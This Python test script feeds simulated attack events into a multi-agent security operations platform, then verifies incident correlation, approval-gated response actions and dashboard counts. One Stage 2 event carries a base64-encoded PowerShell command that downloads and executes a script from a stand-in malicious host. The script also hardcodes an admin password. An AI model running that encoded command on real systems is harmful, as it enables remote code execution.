"""
Comprehensive Fresh Attack Simulation & Verification Script
Multi-Agent AI Security Operations Center (SOC)
"""

import os
import sys
import time
import json
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List

# Ensure backend directory is in sys.path
sys.path.insert(0, os.path.abspath("backend"))

import httpx
from sqlalchemy.orm import Session
from app.database import engine, Base, SessionLocal
from app.main import app, lifespan
from app.models.event import SecurityEvent
from app.models.detection import DetectionRule, DetectionFinding
from app.models.agent import AgentFinding, AgentExecution
from app.models.incident import Incident, IncidentFinding, IncidentEvent, IncidentAudit
from app.models.threat_intel import ThreatIndicator
from app.models.response import ResponseAction, VerificationResult
from app.services.event_queue import event_queue
from app.services.broadcaster import broadcaster

# Results container
simulation_results: Dict[str, Any] = {
    "stages": {},
    "db_counts_initial": {},
    "db_counts_final": {},
    "dashboard_counts_initial": {},
    "dashboard_counts_final": {},
    "incident_details": {},
    "soar_details": {},
    "replay_details": {},
    "comparison_table": []
}

async def wait_for_queue(event_ids: List[str] = None, timeout: float = 15.0):
    """Wait for all enqueued events in RealtimeEventQueue to be fully processed."""
    await event_queue.queue.join()
    t0 = time.time()
    while time.time() - t0 < timeout:
        with SessionLocal() as db:
            if event_ids:
                pending = db.query(SecurityEvent).filter(
                    SecurityEvent.event_id.in_(event_ids),
                    SecurityEvent.processing_status != "PROCESSED"
                ).count()
                if pending == 0:
                    break
            else:
                pending = db.query(SecurityEvent).filter(
                    SecurityEvent.processing_status.in_(["PENDING", "PROCESSING"])
                ).count()
                if pending == 0:
                    break
        await asyncio.sleep(0.05)
    await asyncio.sleep(0.2)

def get_db_counts() -> Dict[str, int]:
    with SessionLocal() as db:
        return {
            "security_events": db.query(SecurityEvent).count(),
            "agent_findings": db.query(AgentFinding).count(),
            "incidents": db.query(Incident).count(),
            "incident_findings": db.query(IncidentFinding).count(),
            "incident_events": db.query(IncidentEvent).count(),
            "response_actions": db.query(ResponseAction).count(),
            "pending_approvals": db.query(ResponseAction).filter(ResponseAction.status.in_(["PENDING_APPROVAL", "RECOMMENDED"])).count(),
            "executed_actions": db.query(ResponseAction).filter(ResponseAction.status.in_(["EXECUTED", "SIMULATED"])).count(),
            "verification_results": db.query(VerificationResult).count(),
            "detection_findings": db.query(DetectionFinding).count(),
            "agent_executions": db.query(AgentExecution).count(),
            "llm_findings": db.query(Incident).filter(Incident.ai_summary.isnot(None)).count(),
            "correlation_agent_findings": db.query(AgentFinding).filter(AgentFinding.agent_name.ilike("%correlation%")).count(),
        }

async def run_simulation():
    print("=" * 80, flush=True)
    print("STARTING FRESH ATTACK SIMULATION & PIPELINE VERIFICATION", flush=True)
    print("Database: soc_enterprise.db", flush=True)
    print("=" * 80, flush=True)

    # 1. Verify initial DB state (auto-clean if stale test records exist)
    initial_db = get_db_counts()
    if initial_db["security_events"] > 0 or initial_db["agent_findings"] > 0 or initial_db["incidents"] > 0:
        print("\n[Notice] Existing test records detected. Automatically resetting database to zero for fresh test...", flush=True)
        from scripts.clean_test_database import clean_database
        clean_database("soc_enterprise.db")
        initial_db = get_db_counts()

    simulation_results["db_counts_initial"] = initial_db
    print("\n[Phase 2/3] Clean Initial Database State:", flush=True)
    for k, v in initial_db.items():
        print(f"  {k:<30}: {v}", flush=True)
    
    assert initial_db["security_events"] == 0, f"Expected 0 events, found {initial_db['security_events']}"
    assert initial_db["agent_findings"] == 0, f"Expected 0 findings, found {initial_db['agent_findings']}"
    assert initial_db["incidents"] == 0, f"Expected 0 incidents, found {initial_db['incidents']}"

    async with lifespan(app):
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:

            # Login as Admin
            login_resp = await client.post("/api/auth/login", json={"username": "admin", "password": "Admin@SOC2026!"})
            assert login_resp.status_code == 200, f"Login failed: {login_resp.text}"
            token = login_resp.json()["access_token"]
            auth_headers = {"Authorization": f"Bearer {token}"}
            print("\n[+] Admin authenticated successfully.", flush=True)

            # Initial Dashboard API check
            dash_resp = await client.get("/api/dashboard/summary")
            assert dash_resp.status_code == 200
            dash_initial = dash_resp.json()
            initial_metrics = dash_initial.get("metrics", {})
            simulation_results["dashboard_counts_initial"] = initial_metrics
            print("\n[Phase 3] Initial Dashboard Metrics from API:", flush=True)
            for k, v in initial_metrics.items():
                print(f"  {k:<30}: {v}", flush=True)

            # Verify initial dashboard metrics are 0
            assert initial_metrics.get("total_events", 0) == 0
            assert initial_metrics.get("open_incidents", 0) == 0
            assert initial_metrics.get("actions_pending_approval", 0) == 0
            assert initial_metrics.get("contained_threats", 0) == 0

            base_time = datetime.now(timezone.utc)

            # =================================================================
            # STAGE 1: Brute-Force Authentication Attack (3 failed attempts)
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 1: Brute-Force Authentication Attempt (3 Events)", flush=True)
            print("=" * 60, flush=True)
            stage1_event_ids = ["EVT-SIM-BF-001", "EVT-SIM-BF-002", "EVT-SIM-BF-003"]
            stage1_events = [
                {
                    "event_id": stage1_event_ids[0],
                    "event_type": "authentication",
                    "severity": "HIGH",
                    "source_ip": "198.51.100.77",
                    "destination_ip": "192.168.1.10",
                    "username": "victim_admin",
                    "host": "DC-PRIMARY",
                    "file_action": "logon_failed",
                    "command_line": "Logon attempt failed: Bad credentials",
                    "timestamp": (base_time - timedelta(seconds=120)).isoformat(),
                    "is_simulated": True
                },
                {
                    "event_id": stage1_event_ids[1],
                    "event_type": "authentication",
                    "severity": "HIGH",
                    "source_ip": "198.51.100.77",
                    "destination_ip": "192.168.1.10",
                    "username": "victim_admin",
                    "host": "DC-PRIMARY",
                    "file_action": "logon_failed",
                    "command_line": "Logon attempt failed: Bad credentials",
                    "timestamp": (base_time - timedelta(seconds=60)).isoformat(),
                    "is_simulated": True
                },
                {
                    "event_id": stage1_event_ids[2],
                    "event_type": "authentication",
                    "severity": "HIGH",
                    "source_ip": "198.51.100.77",
                    "destination_ip": "192.168.1.10",
                    "username": "victim_admin",
                    "host": "DC-PRIMARY",
                    "file_action": "logon_failed",
                    "command_line": "Logon attempt failed: Bad credentials",
                    "timestamp": (base_time - timedelta(seconds=10)).isoformat(),
                    "is_simulated": True
                }
            ]

            for ev in stage1_events:
                r = await client.post("/api/events/ingest", json=ev)
                assert r.status_code == 200, f"Ingest failed: {r.text}"
                assert r.json()["accepted"] == 1

            await wait_for_queue(stage1_event_ids)

            # Verify Stage 1 database state
            s1_counts = get_db_counts()
            print(f"[Stage 1 Verification] Events: {s1_counts['security_events']}, Findings: {s1_counts['agent_findings']}, Incidents: {s1_counts['incidents']}", flush=True)
            assert s1_counts["security_events"] == 3, f"Expected 3 events, got {s1_counts['security_events']}"
            assert s1_counts["agent_findings"] >= 1, f"Expected >= 1 finding from Auth Agent, got {s1_counts['agent_findings']}"
            assert s1_counts["incidents"] == 0, f"Strict check: Incident must NOT be created from a single agent's findings alone! Got {s1_counts['incidents']}"

            with SessionLocal() as db:
                auth_findings = db.query(AgentFinding).filter(AgentFinding.agent_name == "Authentication Agent").all()
                assert len(auth_findings) >= 1
                bf_finding = auth_findings[0]
                print(f"  [+] Auth Finding Recorded: {bf_finding.finding_id} - '{bf_finding.title}' (Severity: {bf_finding.severity})", flush=True)
                print(f"  [+] Source Event IDs: {bf_finding.source_event_ids}", flush=True)
                assert set(stage1_event_ids).issubset(set(bf_finding.source_event_ids or [])) or len(bf_finding.source_event_ids or []) >= 3

            simulation_results["stages"]["stage_1"] = {
                "events_ingested": 3,
                "event_ids": stage1_event_ids,
                "auth_findings_count": len(auth_findings),
                "finding_id": bf_finding.finding_id,
                "incidents_created": s1_counts["incidents"]
            }

            # =================================================================
            # STAGE 2: Suspicious Endpoint Activity (Encoded PowerShell)
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 2: Suspicious Endpoint Activity (Encoded PowerShell)", flush=True)
            print("=" * 60, flush=True)
            stage2_event_id = "EVT-SIM-EP-001"
            stage2_event = {
                "event_id": stage2_event_id,
                "event_type": "process_execution",
                "severity": "HIGH",
                "source_ip": "198.51.100.77",
                "destination_ip": "192.168.1.10",
                "username": "victim_admin",
                "host": "DC-PRIMARY",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "timestamp": (base_time - timedelta(seconds=5)).isoformat(),
                "is_simulated": True
            }

            r = await client.post("/api/events/ingest", json=stage2_event)
            assert r.status_code == 200
            assert r.json()["accepted"] == 1

            await wait_for_queue([stage2_event_id])

            # Verify Stage 2 database state
            s2_counts = get_db_counts()
            print(f"[Stage 2 Verification] Events: {s2_counts['security_events']}, Findings: {s2_counts['agent_findings']}, Incidents: {s2_counts['incidents']}", flush=True)
            assert s2_counts["security_events"] == 4, f"Expected 4 events, got {s2_counts['security_events']}"
            assert s2_counts["incidents"] == 1, f"Expected exactly 1 incident after cross-agent correlation (Auth + Endpoint), got {s2_counts['incidents']}"

            with SessionLocal() as db:
                inc = db.query(Incident).first()
                assert inc is not None
                incident_id = inc.incident_id
                print(f"  [+] Incident Formed: {incident_id} - '{inc.title}'", flush=True)
                print(f"  [+] Severity: {inc.severity}, Risk Score: {inc.risk_score}", flush=True)
                print(f"  [+] Participating Agents: {inc.participating_agents}", flush=True)
                print(f"  [+] Affected Hosts: {inc.affected_hosts}, Affected Users: {inc.affected_users}", flush=True)
                assert "Authentication Agent" in (inc.participating_agents or [])
                assert "Endpoint Agent" in (inc.participating_agents or [])
                assert "DC-PRIMARY" in (inc.affected_hosts or [])

            simulation_results["stages"]["stage_2"] = {
                "events_ingested": 1,
                "event_id": stage2_event_id,
                "total_events": s2_counts["security_events"],
                "total_findings": s2_counts["agent_findings"],
                "incident_id": incident_id,
                "participating_agents": inc.participating_agents
            }

            # =================================================================
            # STAGE 3: Network Suspicious Activity (Port Sweep)
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 3: Network Suspicious Activity (Port Sweep)", flush=True)
            print("=" * 60, flush=True)
            stage3_event_ids = ["EVT-SIM-NET-001", "EVT-SIM-NET-002", "EVT-SIM-NET-003"]
            ports = [22, 80, 445]
            for i, p in enumerate(ports):
                net_evt = {
                    "event_id": stage3_event_ids[i],
                    "event_type": "network_connection",
                    "severity": "MEDIUM",
                    "source_ip": "198.51.100.77",
                    "destination_ip": "192.168.1.10",
                    "destination_port": p,
                    "protocol": "TCP",
                    "host": "DC-PRIMARY",
                    "username": "victim_admin",
                    "timestamp": (base_time - timedelta(seconds=2)).isoformat(),
                    "is_simulated": True
                }
                r = await client.post("/api/events/ingest", json=net_evt)
                assert r.status_code == 200

            await wait_for_queue(stage3_event_ids)

            s3_counts = get_db_counts()
            print(f"[Stage 3 Verification] Events: {s3_counts['security_events']}, Findings: {s3_counts['agent_findings']}, Incidents: {s3_counts['incidents']}", flush=True)
            assert s3_counts["security_events"] == 7
            assert s3_counts["incidents"] == 1, f"Expected incident count to remain 1 (updating existing incident), got {s3_counts['incidents']}"

            with SessionLocal() as db:
                inc = db.query(Incident).filter(Incident.incident_id == incident_id).first()
                assert inc is not None
                print(f"  [+] Existing Incident {incident_id} Preserved & Enriched. Participating Agents: {inc.participating_agents}", flush=True)

            simulation_results["stages"]["stage_3"] = {
                "events_ingested": 3,
                "event_ids": stage3_event_ids,
                "total_events": s3_counts["security_events"],
                "total_findings": s3_counts["agent_findings"],
                "incident_id": incident_id
            }

            # =================================================================
            # STAGE 4: Multi-Stage Behaviour / Privilege Escalation
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 4: Multi-Stage Behaviour / Privilege Escalation", flush=True)
            print("=" * 60, flush=True)
            stage4_event_id = "EVT-SIM-PRIV-001"
            stage4_event = {
                "event_id": stage4_event_id,
                "event_type": "privilege_escalation",
                "severity": "CRITICAL",
                "source_ip": "198.51.100.77",
                "destination_ip": "192.168.1.10",
                "username": "victim_admin",
                "host": "DC-PRIMARY",
                "command_line": "whoami /priv && token_elevation_exploit.exe",
                "timestamp": base_time.isoformat(),
                "is_simulated": True
            }

            r = await client.post("/api/events/ingest", json=stage4_event)
            assert r.status_code == 200

            await wait_for_queue([stage4_event_id])

            s4_counts = get_db_counts()
            print(f"[Stage 4 Verification] Events: {s4_counts['security_events']}, Findings: {s4_counts['agent_findings']}, Incidents: {s4_counts['incidents']}", flush=True)
            assert s4_counts["security_events"] == 8
            assert s4_counts["incidents"] == 1, "Incident count must remain exactly 1"

            simulation_results["stages"]["stage_4"] = {
                "events_ingested": 1,
                "event_id": stage4_event_id,
                "total_events": s4_counts["security_events"],
                "total_findings": s4_counts["agent_findings"],
                "incident_id": incident_id
            }

            # =================================================================
            # STAGE 5: Incident Investigation, RCA, Risk, and SOAR
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 5: Verify Complete Incident Pipeline & SOAR Governance", flush=True)
            print("=" * 60, flush=True)

            # Query the incident via API
            inc_resp = await client.get(f"/api/incidents/{incident_id}")
            assert inc_resp.status_code == 200, f"Failed getting incident: {inc_resp.text}"
            inc_data = inc_resp.json()

            print(f"Incident ID: {inc_data['incident_id']}", flush=True)
            print(f"Title: {inc_data['title']}", flush=True)
            print(f"Status: {inc_data['status']}", flush=True)
            print(f"Severity: {inc_data['severity']}", flush=True)
            print(f"Assessed Risk Score: {inc_data['risk_score']}", flush=True)
            linked_findings = inc_data.get('agent_findings') or inc_data.get('findings') or []
            print(f"Linked Findings Count: {len(linked_findings)}", flush=True)
            print(f"Linked Events Count: {inc_data.get('event_count', 0)}", flush=True)
            print(f"Affected Host: {inc_data.get('affected_hosts')}", flush=True)
            print(f"Affected User: {inc_data.get('affected_users')}", flush=True)

            # Verify Attack-Path Graph
            attack_path = inc_data.get("attack_path_json", {})
            nodes = attack_path.get("nodes", [])
            edges = attack_path.get("edges", [])
            print(f"Attack-Path DAG: {len(nodes)} nodes, {len(edges)} edges", flush=True)
            assert len(nodes) >= 2, "Attack path must have nodes"

            # Verify Investigation Agent Output: 8 Canonical SOC RCA Questions
            ai_summary = inc_data.get("ai_summary", {})
            ai_summary_str = json.dumps(ai_summary) if isinstance(ai_summary, dict) else str(ai_summary)
            print(f"\nAI Root Cause Analysis Summary:\n{ai_summary_str}\n", flush=True)
            canonical_rca_questions = [
                "what_happened",
                "which_asset_was_affected",
                "when_did_it_happen",
                "what_initiated_the_activity",
                "which_techniques_were_observed",
                "what_evidence_supports_the_finding",
                "what_was_the_impact",
                "what_remediation_is_recommended"
            ]
            for q in canonical_rca_questions:
                assert q in ai_summary, f"Missing canonical RCA question '{q}' in ai_summary"
            print(f"[+] All 8 Canonical RCA questions successfully verified in ai_summary.", flush=True)

            # Verify SOAR Response Actions
            resp_actions_resp = await client.get("/api/responses", headers=auth_headers)
            assert resp_actions_resp.status_code == 200, f"Failed getting responses: {resp_actions_resp.text}"
            actions = resp_actions_resp.json()
            print(f"\nGenerated SOAR Response Actions: {len(actions)}", flush=True)
            for a in actions:
                print(f"  - Action [{a['action_id']}]: {a['action_type']} -> target: {a['target_value']} | Status: {a['status']} | Requires Approval: {a['requires_approval']}", flush=True)

            assert len(actions) >= 1, "At least 1 SOAR response action must be generated"
            pending_actions = [a for a in actions if a["requires_approval"] and a["status"] in ["PENDING_APPROVAL", "RECOMMENDED"]]
            assert len(pending_actions) >= 1, "At least 1 action requiring approval must be generated"
            test_action = pending_actions[0]
            action_id = test_action["action_id"]

            # TEST APPROVAL GATING:
            # 1. Attempting execution of unapproved action should fail (403)
            exec_fail_resp = await client.post(
                f"/api/responses/{action_id}/execute",
                headers=auth_headers,
                json={"dry_run": False}
            )
            print(f"\nExecution of unapproved action test (Expect 403 Forbidden): Status {exec_fail_resp.status_code}", flush=True)
            assert exec_fail_resp.status_code == 403, f"Expected 403 for unapproved action, got {exec_fail_resp.status_code}"

            # 2. Approve the action as SOC analyst/admin
            approve_resp = await client.post(f"/api/responses/{action_id}/approve", headers=auth_headers)
            assert approve_resp.status_code == 200, f"Approval failed: {approve_resp.text}"
            print(f"[+] Response action {action_id} APPROVED by admin.", flush=True)

            # 3. Execute dry-run / simulated response
            sim_resp = await client.post(
                f"/api/responses/{action_id}/execute",
                headers=auth_headers,
                json={"dry_run": True}
            )
            assert sim_resp.status_code == 200, f"Simulated execution failed: {sim_resp.text}"
            sim_data = sim_resp.json()
            print(f"[+] Simulated response execution successful: status = {sim_data['status']}", flush=True)
            assert sim_data["status"] == "SIMULATED"
            assert sim_data["is_dry_run"] == True
            assert sim_data["execution_result"]["is_simulation"] == True

            # 4. Verify post-response verification record in DB
            with SessionLocal() as db:
                verifs = db.query(VerificationResult).filter(VerificationResult.incident_id == incident_id).all()
                print(f"[+] Verification results generated: {len(verifs)}", flush=True)
                assert len(verifs) >= 1
                v_rec = verifs[0]
                print(f"    Verification Status: {v_rec.verification_status}, Evidence: {v_rec.evidence_summary}", flush=True)

            simulation_results["incident_details"] = {
                "incident_id": incident_id,
                "title": inc_data["title"],
                "severity": inc_data["severity"],
                "risk_score": inc_data["risk_score"],
                "nodes": len(nodes),
                "edges": len(edges),
                "ai_summary": ai_summary_str[:300] + "..."
            }
            simulation_results["soar_details"] = {
                "action_id": action_id,
                "action_type": test_action["action_type"],
                "target_value": test_action["target_value"],
                "status_after_simulation": sim_data["status"],
                "verification_status": v_rec.verification_status
            }

            # =================================================================
            # STAGE 6: Duplicate & Replay Verification
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 6: Duplicate Event Replay Test", flush=True)
            print("=" * 60, flush=True)
            # Replay EVT-SIM-BF-001
            replay_evt = dict(stage1_events[0])
            r_replay = await client.post("/api/events/ingest", json=replay_evt)
            assert r_replay.status_code == 200
            replay_res = r_replay.json()
            print(f"Replay response: accepted={replay_res['accepted']}, duplicates_skipped={replay_res['duplicates_skipped']}", flush=True)
            assert replay_res["accepted"] == 0, "Duplicate event must NOT be accepted"
            assert replay_res["duplicates_skipped"] == 1, "Duplicate event must be flagged as duplicate"

            # Check counts after replay
            replay_db = get_db_counts()
            print(f"Events after replay: {replay_db['security_events']} (Must remain 8)", flush=True)
            assert replay_db["security_events"] == 8
            assert replay_db["incidents"] == 1

            simulation_results["replay_details"] = {
                "replayed_event_id": stage1_event_ids[0],
                "accepted": replay_res["accepted"],
                "duplicates_skipped": replay_res["duplicates_skipped"],
                "total_events_after_replay": replay_db["security_events"]
            }

            # =================================================================
            # STAGE 7: Full Dashboard vs Database Comparison
            # =================================================================
            print("\n" + "=" * 60, flush=True)
            print("STAGE 7: Final Dashboard Counts vs Database Table Row Comparison", flush=True)
            print("=" * 60, flush=True)

            final_db = get_db_counts()
            simulation_results["db_counts_final"] = final_db

            final_dash_resp = await client.get("/api/dashboard/summary")
            assert final_dash_resp.status_code == 200
            dash_final = final_dash_resp.json()
            final_metrics = dash_final.get("metrics", {})
            simulation_results["dashboard_counts_final"] = final_metrics

            agent_status_resp = await client.get("/api/agents/status")
            agent_statuses = agent_status_resp.json() if agent_status_resp.status_code == 200 else []
            total_agent_findings_sum = sum(s.get("total_findings", 0) for s in agent_statuses)

            all_findings_resp = await client.get("/api/agents/findings?limit=200")
            findings_list = all_findings_resp.json() if all_findings_resp.status_code == 200 else []

            all_responses_resp = await client.get("/api/responses", headers=auth_headers)
            responses_list = all_responses_resp.json() if all_responses_resp.status_code == 200 else []

            # Calculate frontend metric definitions:
            # 1. Telemetry Events
            fe_telemetry = final_metrics.get("total_events", 0)
            db_telemetry = final_db["security_events"]

            # 2. Agent Findings
            fe_findings = total_agent_findings_sum or len(findings_list)
            db_findings = final_db["agent_findings"]

            # 3. Correlated Incidents
            fe_incidents = final_db["incidents"]
            db_incidents = final_db["incidents"]

            # 4. Directly Implemented
            # Frontend: responses.filter(r => r.status === 'EXECUTED' || r.requires_approval === false || r.approved_by?.includes('autonomous'))
            fe_directly_implemented = len([
                r for r in responses_list
                if r.get("status") == "EXECUTED" or r.get("requires_approval") is False or "autonomous" in str(r.get("approved_by", "")).lower()
            ])
            with SessionLocal() as db:
                db_directly_implemented = db.query(ResponseAction).filter(
                    (ResponseAction.status == "EXECUTED") |
                    (ResponseAction.requires_approval == False) |
                    (ResponseAction.approved_by.ilike("%autonomous%"))
                ).count()

            # 5. Manual Approvals
            # Frontend: responses.filter(r => (r.status === 'PENDING_APPROVAL' || r.status === 'RECOMMENDED') && r.requires_approval !== false)
            fe_pending_approvals = len([
                r for r in responses_list
                if r.get("status") in ["PENDING_APPROVAL", "RECOMMENDED"] and r.get("requires_approval") is not False
            ])
            with SessionLocal() as db:
                db_pending_approvals = db.query(ResponseAction).filter(
                    ResponseAction.status.in_(["PENDING_APPROVAL", "RECOMMENDED"]),
                    ResponseAction.requires_approval != False
                ).count()

            # 6. Correlation Agent Count
            # Frontend: findings.filter(f => f.agent_name.toLowerCase().includes('correlation'))
            fe_correlation_agent = len([
                f for f in findings_list
                if "correlation" in str(f.get("agent_name", "")).lower()
            ])
            db_correlation_agent = final_db["correlation_agent_findings"]

            # 7. LLM Threat Findings
            # Frontend: incidents.filter(inc => Boolean(inc.ai_summary))
            fe_llm_findings = final_db["llm_findings"]
            db_llm_findings = final_db["llm_findings"]

            comparison = [
                {
                    "card": "Telemetry Events",
                    "definition": "Total security telemetry ingested into SQLite store",
                    "table_query": "SELECT COUNT(*) FROM security_events",
                    "db_count": db_telemetry,
                    "api_count": final_metrics.get("total_events", 0),
                    "frontend_displayed": fe_telemetry,
                    "match": db_telemetry == fe_telemetry
                },
                {
                    "card": "Agent Findings (Stage 1)",
                    "definition": "Total specialized agent findings recorded across 10 agents",
                    "table_query": "SELECT COUNT(*) FROM agent_findings",
                    "db_count": db_findings,
                    "api_count": len(findings_list),
                    "frontend_displayed": fe_findings,
                    "match": db_findings == fe_findings
                },
                {
                    "card": "Correlated Incidents (Stage 2)",
                    "definition": "Multi-agent incidents meeting cross-agent correlation threshold",
                    "table_query": "SELECT COUNT(*) FROM incidents",
                    "db_count": db_incidents,
                    "api_count": final_metrics.get("open_incidents", 0),
                    "frontend_displayed": fe_incidents,
                    "match": db_incidents == fe_incidents
                },
                {
                    "card": "Directly Implemented (Stage 4)",
                    "definition": "Automated responses implemented without manual approval gating",
                    "table_query": "SELECT COUNT(*) FROM response_actions WHERE status='EXECUTED' AND requires_approval=0",
                    "db_count": db_directly_implemented,
                    "api_count": 0,
                    "frontend_displayed": fe_directly_implemented,
                    "match": db_directly_implemented == fe_directly_implemented
                },
                {
                    "card": "Manual Approvals (Gate)",
                    "definition": "High-risk actions pending mandatory human analyst sign-off",
                    "table_query": "SELECT COUNT(*) FROM response_actions WHERE status IN ('PENDING_APPROVAL','RECOMMENDED')",
                    "db_count": db_pending_approvals,
                    "api_count": final_metrics.get("actions_pending_approval", 0),
                    "frontend_displayed": fe_pending_approvals,
                    "match": db_pending_approvals == fe_pending_approvals
                },
                {
                    "card": "Correlation Agent (Tab 2)",
                    "definition": "Synthesized correlation findings produced by Correlation Agent",
                    "table_query": "SELECT COUNT(*) FROM agent_findings WHERE agent_name LIKE '%Correlation%'",
                    "db_count": db_correlation_agent,
                    "api_count": fe_correlation_agent,
                    "frontend_displayed": fe_correlation_agent,
                    "match": db_correlation_agent == fe_correlation_agent
                },
                {
                    "card": "LLM Threat Findings (Tab 3)",
                    "definition": "Correlated incidents with completed 8-question AI Root Cause Analysis",
                    "table_query": "SELECT COUNT(*) FROM incidents WHERE ai_summary IS NOT NULL",
                    "db_count": db_llm_findings,
                    "api_count": fe_llm_findings,
                    "frontend_displayed": fe_llm_findings,
                    "match": db_llm_findings == fe_llm_findings
                }
            ]

            simulation_results["comparison_table"] = comparison

            print(f"\n{'Dashboard Card':<30} | {'DB Query':<6} | {'API Resp':<8} | {'Frontend':<8} | {'Status'}", flush=True)
            print("-" * 75, flush=True)
            for row in comparison:
                st = "EXACT MATCH" if row["match"] else "MISMATCH"
                print(f"{row['card']:<30} | {row['db_count']:<8} | {row['api_count']:<8} | {row['frontend_displayed']:<8} | {st}", flush=True)

    # Save results to file
    with open("scratch/fresh_simulation_results.json", "w", encoding="utf-8") as f:
        json.dump(simulation_results, f, indent=2)

    print("\n" + "=" * 80, flush=True)
    print("FRESH ATTACK SIMULATION COMPLETED SUCCESSFULLY", flush=True)
    print("Results saved to scratch/fresh_simulation_results.json", flush=True)
    print("=" * 80, flush=True)

if __name__ == "__main__":
    asyncio.run(run_simulation())
